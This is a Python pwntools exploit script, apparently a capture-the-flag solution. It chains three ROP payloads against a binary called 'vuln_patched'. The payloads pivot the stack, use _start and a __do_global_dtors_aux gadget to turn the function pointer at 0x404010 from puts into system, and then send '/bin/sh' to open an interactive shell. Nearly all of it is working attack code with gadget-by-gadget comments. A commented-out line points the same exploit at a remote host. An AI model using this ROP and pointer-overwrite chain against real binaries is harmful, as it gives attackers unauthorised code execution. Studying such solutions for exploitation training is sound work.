from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./vuln_patched', '''
    b *0x40120c
    b *0x40121f
    b *0x401226
    continue
''')

# p = remote('smiley.cat', 42447)

glibc_e = ELF('./libc.so.6')

GADGET_1 = 0x401181  # pop rbp; ret;
GADGET_2 = 0x401182  # ret;
GADGET_3 = 0x401205  # lea rax, [rbp-0x20]; mov rdi, rax; call 0x401183; mov rdx, qword ptr [rip+0x2df8]; lea rax, [rbp-0x20]; mov rdi, rax; call rdx; mov eax, 0x0; leave; ret; (call *0x404010)

GADGET_4 = 0x40109d  # _start: and rsp, 0xfffffffffffffff0; push rax; push rsp; xor r8d, r8d; xor ecx, ecx; mov rdi, 0x4011cf; call qword ptr [rip+0x2f3b]; (mov rbx, rdx;...call main;)
GADGET_5 = 0x40114c  # __do_global_dtors_aux: adc edx, dword ptr [rbp+0x48]; mov ebp, esp; call 0x4010d0; mov byte ptr [rip+0x2ec3], 1; pop rbp; ret;
GADGET_6 = 0x40115c  # __do_global_dtors_aux: add dword ptr [rbp-0x3d], ebx; nop; ret;

ATTACK_TARGET = 0x404010  # a function call is performed in main by call *0x404010 with rbp-0x20 as first argument always
STACK_PIVOT_TARGET = 0x404800  # stack pivot to 0x404800 always
FAKE_RBP = 0x405000  # fake rbp value with 0x405000 always

# 1. first ROP: prepare for second ROP and stack pivot to 0x404800
payload1 = b'A'*0x28  # pad 0x28 bytes
payload1 += p64(GADGET_1)+p64(STACK_PIVOT_TARGET-8)  # rbp=0x4047f8
payload1 += p64(GADGET_3)  # call read function in main to read second ROP payload to rbp-0x20=0x4047d8; execute "leave; ret;" instructions in main to stack pivot to 0x404800
p.send(payload1)
pause()

# 2. second ROP: put difference of puts and system into appropriate register and prepare for third ROP
payload2 = b'B'*0x20  # pad 0x20 bytes
payload2 += p64(0x100000000-(glibc_e.sym.puts-glibc_e.sym.system))  # write difference -(glibc_puts_addr-glibc_system_addr)=-0x2f490=0xfffd0b70 into 0x4047f8
payload2 += p64(GADGET_1)+p64(STACK_PIVOT_TARGET-8-0x48)  # rbp=0x4047b0
payload2 += p64(GADGET_5)+p64(0)  # rdx=*(rbp+0x48)=*0x4047f8=-(glibc_puts_addr-glibc_system_addr)=0xfffd0b70; rbp=0
payload2 += p64(GADGET_4)  # call __libc_start_main function in _start to execute "mov rbx, rdx;" instruction to make rbx=rdx=0xfffd0b70 and totally restart main to read third ROP payload
p.send(payload2)
pause()

# 3. third ROP: add difference of puts and system to puts in attack target 0x404010 and prepare for system('/bin/sh\x00')
payload3  = b'C'*0x28  # pad 0x28 bytes
payload3 += p64(GADGET_1)+p64(ATTACK_TARGET+0x3d)  # rbp=0x404010+0x3d=0x40404d
payload3 += p64(GADGET_6)  # *(rbp-0x3d)=*(rbp-0x3d)+rbx=*0x404010+0xfffd0b70=glibc_puts_addr-(glibc_puts_addr-glibc_system_addr)=glibc_system_addr
payload3 += p64(GADGET_1)+p64(FAKE_RBP)  # rbp=0x405000
payload3 += p64(GADGET_2)  # align rsp to 0x10 bytes
payload3 += p64(GADGET_3)  # call read function in main to read '/bin/sh\x00' as first argument for system; call *0x404010 in main to trigger system('/bin/sh\x00')
p.send(payload3)
pause()

# 4. trigger system('/bin/sh\x00')
p.send(b'/bin/sh\x00')  # read in '/bin/sh\x00' to rbp-0x20 and call rbx(rbp-0x20) where rbx=*0x404010=system

p.interactive()

# .;,;.{aaaaaaa_(╯°□°)╯︵ ┻━┻_aaaaaaa}